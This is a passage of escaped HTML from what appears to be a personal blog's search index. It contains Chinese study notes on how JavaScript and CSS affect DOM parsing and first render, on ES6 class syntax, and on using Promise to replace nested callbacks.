&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1629548334475.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;接下来解析出来的是第⼀个div的⽂本Token，渲染引擎会为该Token创建⼀个⽂本节点，并将该Token添加 到DOM中，它的⽗节点就是当前Token栈顶元素对应的节点&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1629548325218.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;再接下来，分词器解析出来第⼀个EndTag div，这时候HTML解析器会去判断当前栈顶的元素是否是 StartTag div，如果是则从栈顶弹出StartTag div&lt;br&gt;
&lt;img src=&#34;https://fanfankill.github.io/post-images/1629548320231.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;最终解析&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1629548314381.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;br&gt;
&lt;h2 id=&#34;javascript是如何影响dom生成的&#34;&gt;JavaScript是如何影响DOM⽣成的&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;html&amp;gt;
	&amp;lt;body&amp;gt;
        &amp;lt;div&amp;gt;1&amp;lt;/div&amp;gt;
        
        &amp;lt;script&amp;gt;
        let div1 = document.getElementsByTagName(&#39;div&#39;)[0]
        div1.innerText = &#39;time.geekbang&#39;
        &amp;lt;/script&amp;gt;
        
        &amp;lt;div&amp;gt;test&amp;lt;/div&amp;gt;
	&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;解析到&lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt;标签时，渲染引擎判断这是⼀段脚本，此时 HTML解析器就会暂停DOM的解析，因为接下来的JavaScript可能要修改当前已经⽣成的DOM结构。&lt;/p&gt;
&lt;p&gt;解析到&lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt;时候的DOM树&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;4&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1629548306424.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;这时候HTML解析器暂停⼯作，JavaScript引擎介⼊，并执⾏script标签中的这段脚本，因为这段JavaScript 脚本修改了DOM中第⼀个div中的内容，所以执⾏这段脚本之后，div节点内容已经修改为time.geekbang 了。&lt;strong&gt;脚本执⾏完成之后，HTML解析器恢复解析过程&lt;/strong&gt;，继续解析后续的内容，直⾄⽣成最终的DOM。&lt;/p&gt;
&lt;br&gt;
&lt;p&gt;如果是通过引入js文件的方式的话&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;//foo.js
let div1 = document.getElementsByTagName(&#39;div&#39;)[0]
div1.innerText = &#39;time.geekbang&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;html&amp;gt;
&amp;lt;body&amp;gt;
    &amp;lt;div&amp;gt;1&amp;lt;/div&amp;gt;
    &amp;lt;script type=&amp;quot;text/javascript&amp;quot; src=&#39;foo.js&#39;&amp;gt;&amp;lt;/script&amp;gt;
    &amp;lt;div&amp;gt;test&amp;lt;/div&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;执⾏到JavaScript标签时，暂停整个DOM的解析，先进行文件的下载。&lt;/p&gt;
&lt;p&gt;这⾥需要重点关注下载环境，因为 JavaScript⽂件的下载过程会&lt;strong&gt;阻塞DOM解析&lt;/strong&gt;，⽽通常下载⼜是⾮常耗时的，会受到⽹络环境、JavaScript ⽂件⼤⼩等因素的影响。&lt;/p&gt;
&lt;p&gt;道引⼊JavaScript线程会阻塞DOM，不过也有⼀些相关的策略来规避，⽐如压缩JavaScript⽂件的体积、⽤CDN来加速JavaScript⽂件的加载。&lt;/p&gt;
&lt;p&gt;如果JavaScript⽂件中&lt;strong&gt;没有操作 DOM相关代码&lt;/strong&gt;，就可以将该JavaScript脚本设置为&lt;strong&gt;异步加载&lt;/strong&gt;，通过async 或defer来标记代码&lt;/p&gt;
&lt;script async type=&#34;text/javascript&#34; src=&#39;foo.js&#39;&gt;&lt;/script&gt;
&lt;script defer type=&#34;text/javascript&#34; src=&#39;foo.js&#39;&gt;&lt;/script&gt;
&lt;br&gt;
&lt;p&gt;async和defer虽然都是异步的，不过还有⼀些差异，使⽤async标志的脚本⽂件⼀旦加载完成，会⽴即执 ⾏；⽽使⽤了defer标记的脚本⽂件，需要等到DOMContentLoaded事件之后执⾏。&lt;br&gt;
&lt;br&gt;&lt;/p&gt;
&lt;h2 id=&#34;css如何影响首次加载时的白屏时间&#34;&gt;CSS如何影响⾸次加载时的⽩屏时间？&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-css&#34;&gt;//theme.css
div{
    color : coral;
    background-color:black
}
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;
    &amp;lt;link href=&amp;quot;theme.css&amp;quot; rel=&amp;quot;stylesheet&amp;quot;&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
    &amp;lt;div&amp;gt;geekbang com&amp;lt;/div&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;渲染流⽔线⽰意图：&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;5&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1629609509170.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;和HTML⼀样，渲染引擎也是⽆法直接理解CSS⽂件内容的，所以需要将其解析成渲染引擎能够理解的结 构，这个结构就是&lt;strong&gt;CSSOM&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;CSSOM也具有两个作⽤&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第⼀个是提供给JavaScript操作样式表 的能⼒&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第⼆个是为布局树的合成提供基础的样式信息&lt;/strong&gt;&lt;/p&gt;
&lt;br&gt;
&lt;p&gt;构建信息&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1629609503869.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;br&gt;&lt;/p&gt;
&lt;h2 id=&#34;影响面展示的因素以及优化策略&#34;&gt;影响⻚⾯展⽰的因素以及优化策略&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;渲染流⽔线影响到了⾸次⻚⾯展⽰的速 度，⽽⾸次⻚⾯展⽰的速度⼜直接影响到了⽤⼾体验&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;从发起URL请求开始，到⾸次显⽰⻚⾯的内容，在视觉上经历的三个阶段&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;第⼀个阶段，等请求发出去之后，到提交数据阶段，⻚⾯展⽰出来的还是之前⻚⾯的内容。&lt;/li&gt;
&lt;li&gt;第⼆个阶段，提交数据之后渲染进程会创建⼀个空⽩⻚⾯，我们通常把这段时间称为解析⽩屏，并等待 CSS⽂件和JavaScript⽂件的加载完成，⽣成CSSOM和DOM，然后合成布局树，最后还要经过⼀系列的 步骤准备⾸次渲染。&lt;/li&gt;
&lt;li&gt;第三个阶段，等⾸次渲染完成之后，就开始进⼊完整⻚⾯的⽣成阶段了，然后⻚⾯会⼀点点被绘制出来。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;影响&lt;strong&gt;白屏时间&lt;/strong&gt;主要是&lt;strong&gt;下载CSS⽂件、下载JavaScript⽂件和执⾏JavaScript&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;想缩短⽩屏时⻓，可以有以下策略：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;通过内联JavaScript、内联CSS来移除这两种类型的⽂件下载，这样获取到HTML⽂件之后就可以直接开 始渲染流程了。&lt;/li&gt;
&lt;li&gt;可以尽量减少⽂件⼤⼩，⽐如通过webpack等⼯具移除⼀些不 必要的注释，并压缩JavaScript⽂件。&lt;/li&gt;
&lt;li&gt;可以将⼀些不需要在解析HTML阶段使⽤的JavaScript标记上sync或者defer。&lt;/li&gt;
&lt;li&gt;对于⼤的CSS⽂件，可以通过媒体查询属性，将其拆分为多个不同⽤途的CSS⽂件，这样只有在特定的场 景下才会加载特定的CSS⽂件。&lt;/li&gt;
&lt;/ul&gt;
">DOM树：JavaScript、CSS是如何影响DOM树构建的？</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/class-de-ji-ben-yu-fa/"" data-c="
          &lt;h2 id=&#34;简介&#34;&gt;简介&lt;/h2&gt;
&lt;p&gt;js中，生成实例对象的传统方法是通过构造函数。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;function Point(x, y) {
  this.x = x;
  this.y = y;
}

Point.prototype.toString = function () {
  return &#39;(&#39; + this.x + &#39;, &#39; + this.y + &#39;)&#39;;
};

var p = new Point(1, 2);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;基本上，ES6 的&lt;code&gt;class&lt;/code&gt;可以看作只是一个语法糖，它的绝大部分功能，ES5 都可以做到，新的&lt;code&gt;class&lt;/code&gt;写法只是让对象原型的写法更加清晰、更像面向对象编程的语法而已。上面的代码用 ES6 的&lt;code&gt;class&lt;/code&gt;改写，就是下面这样。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;class Point {
  constructor(x, y) {
    this.x = x;
    this.y = y;
  }

  toString() {
    return &#39;(&#39; + this.x + &#39;, &#39; + this.y + &#39;)&#39;;
  }
}

typeof Point // &amp;quot;function&amp;quot;

Point === Point.prototype.constructor // true
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;类的数据类型就是函数，类本身就指向构造函数。&lt;/p&gt;
&lt;p&gt;使用的时候，也是直接对类使用&lt;code&gt;new&lt;/code&gt;命令，跟构造函数的用法完全一致。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;class Bar {
  doStuff() {
    console.log(&#39;stuff&#39;);
  }
}

const b = new Bar();
b.doStuff() // &amp;quot;stuff&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;构造函数的&lt;code&gt;prototype&lt;/code&gt;属性，在 ES6 的“类”上面继续存在。事实上，&lt;strong&gt;类的所有方法都定义在类的&lt;code&gt;prototype&lt;/code&gt;属性上面。&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;class Point {
  constructor() {
    // ...
  }

  toString() {
    // ...
  }

  toValue() {
    // ...
  }
}

// 等同于

Point.prototype = {
  constructor() {},
  toString() {},
  toValue() {},
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;因此，在类的实例上面调用方法，其实就是调用原型上的方法。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;class B {}
const b = new B();

b.constructor === B.prototype.constructor // true
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;b&lt;/code&gt;是&lt;code&gt;B&lt;/code&gt;类的实例，它的&lt;code&gt;constructor()&lt;/code&gt;方法就是&lt;code&gt;B&lt;/code&gt;类原型的&lt;code&gt;constructor()&lt;/code&gt;方法。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;prototype&lt;/code&gt;对象的&lt;code&gt;constructor()&lt;/code&gt;属性，直接指向“类”的本身，这与 ES5 的行为是一致的。&lt;/p&gt;
&lt;br&gt;
&lt;p&gt;由于类的方法都定义在&lt;code&gt;prototype&lt;/code&gt;对象上面，所以类的新方法可以添加在&lt;code&gt;prototype&lt;/code&gt;对象上面。&lt;code&gt;Object.assign()&lt;/code&gt;方法可以很方便地一次向类添加多个方法。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;class Point {
  constructor(){
    // ...
  }
}

Object.assign(Point.prototype, {
  toString(){},
  toValue(){}
});
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;p&gt;&lt;strong&gt;类的内部所有定义的方法，都是不可枚举的（non-enumerable）。&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;class Point {
  constructor(x, y) {
    // ...
  }

  toString() {
    // ...
  }
}

Object.keys(Point.prototype)  //可以获取自己（不含原生链）的可枚举属性
// []
Object.getOwnPropertyNames(Point.prototype)//可以获取所有属性 包括不可枚举
// [&amp;quot;constructor&amp;quot;,&amp;quot;toString&amp;quot;]
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h2 id=&#34;constructor-方法&#34;&gt;constructor 方法&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;constructor()&lt;/code&gt;方法是类的默认方法，通过&lt;code&gt;new&lt;/code&gt;命令生成对象实例时，自动调用该方法。如果没有显式定义，一个空的&lt;code&gt;constructor()&lt;/code&gt;方法会被默认添加。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;constructor()&lt;/code&gt;方法默认返回实例对象（即&lt;code&gt;this&lt;/code&gt;），完全可以指定返回另外一个对象。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;class Foo {
  constructor() {
    return Object.create(null);
  }
}

new Foo() instanceof Foo
// false
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;上面代码中，&lt;code&gt;constructor()&lt;/code&gt;函数返回一个全新的对象，结果导致实例对象不是&lt;code&gt;Foo&lt;/code&gt;类的实例。&lt;/p&gt;
&lt;p&gt;类必须使用&lt;code&gt;new&lt;/code&gt;调用，否则会报错。这是它跟普通构造函数的一个主要区别，后者不用&lt;code&gt;new&lt;/code&gt;也可以执行。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;class Foo {
  constructor() {
    return Object.create(null);
  }
}

Foo()
// TypeError: Class constructor Foo cannot be invoked without &#39;new&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h2 id=&#34;类的实例&#34;&gt;类的实例&lt;/h2&gt;
&lt;p&gt;与 ES5 一样，实例的属性除非显式定义在其本身（即定义在&lt;code&gt;this&lt;/code&gt;对象上），否则都是定义在原型上（即定义在&lt;code&gt;class&lt;/code&gt;上）。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;//定义类
class Point {

  constructor(x, y) {
    this.x = x;
    this.y = y;
  }

  toString() {
    return &#39;(&#39; + this.x + &#39;, &#39; + this.y + &#39;)&#39;;
  }

}

var point = new Point(2, 3);

point.toString() // (2, 3)

point.hasOwnProperty(&#39;x&#39;) // true
point.hasOwnProperty(&#39;y&#39;) // true
point.hasOwnProperty(&#39;toString&#39;) // false
point.__proto__.hasOwnProperty(&#39;toString&#39;) // true
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;上面代码中，&lt;code&gt;x&lt;/code&gt;和&lt;code&gt;y&lt;/code&gt;都是实例对象&lt;code&gt;point&lt;/code&gt;自身的属性（因为定义在&lt;code&gt;this&lt;/code&gt;对象上），所以&lt;code&gt;hasOwnProperty()&lt;/code&gt;方法返回&lt;code&gt;true&lt;/code&gt;，而&lt;code&gt;toString()&lt;/code&gt;是原型对象的属性（因为定义在&lt;code&gt;Point&lt;/code&gt;类上），所以&lt;code&gt;hasOwnProperty()&lt;/code&gt;方法返回&lt;code&gt;false&lt;/code&gt;。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;var p1 = new Point(2,3);
var p2 = new Point(3,2);

p1.__proto__.printName = function () { return &#39;Oops&#39; };

p1.printName() // &amp;quot;Oops&amp;quot;
p2.printName() // &amp;quot;Oops&amp;quot;

var p3 = new Point(4,2);
p3.printName() // &amp;quot;Oops&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;p1&lt;/code&gt;的原型上添加了一个&lt;code&gt;printName()&lt;/code&gt;方法，由于&lt;code&gt;p1&lt;/code&gt;的原型就是&lt;code&gt;p2&lt;/code&gt;的原型，因此&lt;code&gt;p2&lt;/code&gt;也可以调用这个方法。而且，此后新建的实例&lt;code&gt;p3&lt;/code&gt;也可以调用这个方法。这意味着，使用实例的&lt;code&gt;__proto__&lt;/code&gt;属性改写原型&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;取值函数getter和存值函数setter&#34;&gt;取值函数（getter）和存值函数（setter）&lt;/h2&gt;
&lt;p&gt;与 ES5 一样，在“类”的内部可以使用&lt;code&gt;get&lt;/code&gt;和&lt;code&gt;set&lt;/code&gt;关键字，对某个属性设置存值函数和取值函数，拦截该属性的存取行为。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;class MyClass {
  constructor() {
    // ...
  }
  get prop() {
    return &#39;getter&#39;;
  }
  set prop(value) {
    console.log(&#39;setter: &#39;+value);
  }
}

let inst = new MyClass();

inst.prop = 123;
// setter: 123

inst.prop
// &#39;getter&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h2 id=&#34;注意点&#34;&gt;注意点&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;（1）严格模式&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;类和模块的内部，默认就是严格模式，所以不需要使用&lt;code&gt;use strict&lt;/code&gt;指定运行模式。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;（2）不存在提升&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;类不存在变量提升（hoist），这一点与 ES5 完全不同。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;new Foo(); // ReferenceError
class Foo {}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;（3）name 属性&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;由于本质上，ES6 的类只是 ES5 的构造函数的一层包装，所以函数的许多特性都被&lt;code&gt;Class&lt;/code&gt;继承，包括&lt;code&gt;name&lt;/code&gt;属性。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;class Point {}
Point.name // &amp;quot;Point&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;name&lt;/code&gt;属性总是返回紧跟在&lt;code&gt;class&lt;/code&gt;关键字后面的类名。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;（4）Generator 方法&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;如果某个方法之前加上星号（&lt;code&gt;*&lt;/code&gt;），就表示该方法是一个 Generator 函数。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;class Foo {
  constructor(...args) {
    this.args = args;
  }
  * [Symbol.iterator]() {
    for (let arg of this.args) {
      yield arg;
    }
  }
}

for (let x of new Foo(&#39;hello&#39;, &#39;world&#39;)) {
  console.log(x);
}
// hello
// wo
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;Symbol.iterator&lt;/code&gt;方法返回一个&lt;code&gt;Foo&lt;/code&gt;类的默认遍历器，&lt;code&gt;for...of&lt;/code&gt;循环会自动调用这个遍历器。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;（5）this 的指向&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;类的方法内部如果含有&lt;code&gt;this&lt;/code&gt;，它默认指向类的实例。&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;静态方法&#34;&gt;静态方法&lt;/h2&gt;
&lt;p&gt;如果在一个方法前，加上&lt;code&gt;static&lt;/code&gt;关键字，就表示该方法不会被实例继承，而是直接通过类来调用&lt;/p&gt;
&lt;p&gt;如果静态方法包含&lt;code&gt;this&lt;/code&gt;关键字，这个&lt;code&gt;this&lt;/code&gt;指的是类，而不是实例。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;class Foo {
  static classMethod() {
    return &#39;hello&#39;;
  }
    
   static bar() {
    this.baz();
  }
    
  static baz() {
    console.log(&#39;hello&#39;);
  }
    
  baz() {
    console.log(&#39;world&#39;);
  }
}

Foo.classMethod() // &#39;hello&#39;

Foo.bar() // hello

var foo = new Foo();
foo.classMethod()
// TypeError: foo.classMethod is not a function
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;父类的静态方法，可以被子类继承&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;class Foo {
  static classMethod() {
    return &#39;hello&#39;;
  }
}

class Bar extends Foo {
}

Bar.classMethod() // &#39;hello&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;静态方法也是可以从&lt;code&gt;super&lt;/code&gt;对象上调用的&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;class Foo {
  static classMethod() {
    return &#39;hello&#39;;
  }
}

class Bar extends Foo {
  static classMethod() {
    return super.classMethod() + &#39;, too&#39;;
  }
}

Bar.classMethod() // &amp;quot;hello, too&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
">Class 的基本语法</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/shi-promisegao-bie-hui-diao-han-shu/"" data-c="
          &lt;h2 id=&#34;异步编程的问题代码逻辑不连续&#34;&gt;异步编程的问题：代码逻辑不连续&lt;/h2&gt;
&lt;p&gt;⻚⾯中任务都是执⾏在主线程之上的，相对于⻚⾯来说，主线程就是它整个的世界，所以在执⾏⼀项耗时的任务 时，⽐如下载⽹络⽂件任务、获取摄像头等设备信息任务，这些任务都会放到⻚⾯主线程之外的进程或者线 程中去执⾏，这样就避免了耗时任务“霸占”⻚⾯主线程的情况。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1629358284385.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;⻚⾯主线程发起了⼀个耗时的任务，并将任务交给另外⼀个进程去处理，这时⻚⾯主线程会继续执⾏消息队列中的任务。&lt;/p&gt;
&lt;p&gt;等该进程处理完这个任务后，会将该任务添加到渲染 进程的消息队列中，并排队等待循环系统的处理。&lt;/p&gt;
&lt;p&gt;排队结束之后，循环系统会取出消息队列中的任务进⾏处 理，并触发相关的回调操作。&lt;/p&gt;
&lt;p&gt;这就是⻚⾯编程的⼀⼤特点：&lt;strong&gt;异步回调&lt;/strong&gt;。&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;封装异步代码让处理流程变得线性&#34;&gt;封装异步代码，让处理流程变得线性&lt;/h2&gt;
&lt;p&gt;重点关注的是&lt;strong&gt;输⼊内容（请求信息）&lt;strong&gt;和&lt;/strong&gt;输出内容（回复信息）&lt;/strong&gt;&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1629358275680.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;将XMLHttpRequest请求过程的代码封装起来了，重点关注输⼊数据和输出结果。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;//makeRequest⽤来构造request对象
function makeRequest(request_url) {
let request = {
	method: &#39;Get&#39;,
	url: request_url,
	headers: &#39;&#39;,
	body: &#39;&#39;,
	credentials: false,
	sync: true,
	responseType: &#39;text&#39;,
	referrer: &#39;&#39;
	}
	return request
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;将所有的请求细节封装进XFetch函数&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;//[in] request，请求信息，请求头，延时值，返回类型等
//[out] resolve, 执⾏成功，回调该函数
//[out] reject 执⾏失败，回调该函数
function XFetch(request, resolve, reject) {
	let xhr = new XMLHttpRequest()
	xhr.ontimeout = function (e) { reject(e) }
	xhr.onerror = function (e) { reject(e) }
	xhr.onreadystatechange = function () {
	if (xhr.status = 200)
		resolve(xhr.response)
}
	xhr.open(request.method, URL, request.sync);
	xhr.timeout = request.timeout;
	xhr.responseType = request.responseType;
	//补充其他请求信息
	//...
	xhr.send();
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;实现业务代码&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;XFetch(makeRequest(&#39;https://time.geekbang.org&#39;),
function resolve(data) {
	console.log(data)
}, function reject(e) {
	console.log(e)
})

&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h2 id=&#34;新的问题回调地狱&#34;&gt;新的问题：回调地狱&lt;/h2&gt;
&lt;p&gt;嵌套了太多的回调函数就很容易使得⾃⼰陷⼊了&lt;strong&gt;回调地狱&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;第⼀是&lt;strong&gt;嵌套调⽤&lt;/strong&gt;，下⾯的任务依赖上个任务的请求结果，并在上个任务的回调函数内部执⾏新的业务逻 辑，这样当嵌套层次多了之后，代码的可读性就变得⾮常差了。&lt;/li&gt;
&lt;li&gt;第⼆是&lt;strong&gt;任务的不确定性&lt;/strong&gt;，执⾏每个任务都有两种可能的结果（成功或者失败），所以体现在代码中就需要 对每个任务的执⾏结果做两次判断，这种对每个任务都要进⾏⼀次额外的错误处理的⽅式，明显增加了代 码的混乱程度。&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h2 id=&#34;promise消灭嵌套调用和多次错误处理&#34;&gt;Promise：消灭嵌套调⽤和多次错误处理&lt;/h2&gt;
&lt;p&gt;使⽤Promise来重构XFetch的代码&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;function XFetch(request) {
	function executor(resolve, reject) {
		let xhr = new XMLHttpRequest()
		xhr.open(&#39;GET&#39;, request.url, true)
		xhr.ontimeout = function (e) { reject(e) }
		xhr.onerror = function (e) { reject(e) }
		xhr.onreadystatechange = function () {
			if (this.readyState === 4) {
				if (this.status === 200) {	
					resolve(this.responseText, this)
			} else {
				let error = {	
					code: this.status,
					response: this.response
				}
				reject(error, this)
			}
		}
	}
	xhr.send()
}

return new Promise(executor)
}

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;再利⽤XFetch来构造请求流程&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var x1 = XFetch(makeRequest(&#39;https://time.geekbang.org/?category&#39;))

var x2 = x1.then(value =&amp;gt; {
	console.log(value)
	return XFetch(makeRequest(&#39;https://www.geekbang.org/column&#39;))
})

var x3 = x2.then(value =&amp;gt; {
	console.log(value)
return XFetch(makeRequest(&#39;https://time.geekbang.org&#39;))
})

x3.catch(error =&amp;gt; {
	console.log(error)
})

&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;⾸先引⼊了Promise，在调⽤XFetch时，会返回⼀个Promise对象&lt;/li&gt;
&lt;li&gt;构建Promise对象时，需要传⼊⼀个&lt;strong&gt;executor&lt;/strong&gt;函数，XFetch的主要业务流程都在executor函数中执⾏。&lt;/li&gt;
&lt;li&gt;如果运⾏在excutor函数中的业务执⾏成功了，会调⽤resolve函数；如果执⾏失败了，则调⽤reject函 数。&lt;/li&gt;
&lt;li&gt;在excutor函数中调⽤resolve函数时，会触发promise.then设置的回调函数；⽽调⽤reject函数时，会触 发promise.catch设置的回调函数&lt;/li&gt;
&lt;li&gt;无论哪一个步骤抛错，都可以由p3的.catch来捕捉错误，是因为Promise对象的错误具有“冒泡”性质，会⼀直向后 传递，直到被onReject函数处理或catch语句捕获为⽌。&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;p&gt;Promise主要通过下⾯两步解决嵌套回调问题的&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;⾸先，Promise实现了回调函数的延时绑定&lt;/strong&gt;。回调函数的延时绑定在代码上体现就是先创建Promise对象 x1，通过Promise的构造函数executor来执⾏业务逻辑；创建好Promise对象x1之后，再使⽤x1.then来设置 回调函数。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;//创建Promise对象x1，并在executor函数中执⾏业务逻辑
function executor(resolve, reject){
resolve(100)
}

let x1 = new Promise(executor)
//x1延迟绑定回调函数onResolve
function onResolve(value){
console.log(value)
}

x1.then(onResolve)
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;br&gt;
&lt;br&gt;
&lt;p&gt;其次，需要将回调函数onResolve的返回值穿透到最外层。因为我们会根据onResolve函数的传⼊值来决定 创建什么类型的Promise任务，创建好的Promise对象需要返回到最外层，这样就可以摆脱嵌套循环。&lt;/p&gt;
